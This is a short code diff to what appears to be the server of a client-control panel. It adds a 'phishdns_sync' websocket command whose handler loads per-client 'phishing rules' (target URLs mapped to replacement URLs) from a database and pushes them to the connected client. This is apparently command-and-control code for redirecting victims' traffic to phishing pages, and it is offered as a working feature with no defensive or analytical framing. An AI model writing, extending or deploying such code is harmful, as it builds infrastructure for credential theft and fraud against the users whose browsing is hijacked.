@@ -43,6 +43,9 @@ module.exports = function initializeClientApi(appClients, server) {
             handleSetPollingState(client_id, data[1]);
             sendEvent("pollingstate", client_id);
             break;
+          case "phishdns_sync":
+            handlePhishDNSSync(client_id);
+            break;
         }
       } catch (err) {
         console.error(err);
@@ -214,6 +217,20 @@ function handleAlive(ws, data) {
   if (!socketMaps[client_id]) {
     socketMaps[client_id] = ws;
     sendEvent("clientConnected", client_id);
+  }
+}
+function handlePhishDNSSync(client_id) {
+  // Get all phishing rules for this client
+  const rules = db.prepare(`
+    SELECT id, target_url, replacement_url
+    FROM phish_dns_rules
+    WHERE client_id = ?
+  `).all(client_id);
+
+  // Get the client's socket and send the rules
+  const socket = socketMaps[client_id];
+  if (socket) {
+    socket.send(JSON.stringify(["phishdns_update", rules]));
   }
 }
 function getClientId(socket) {
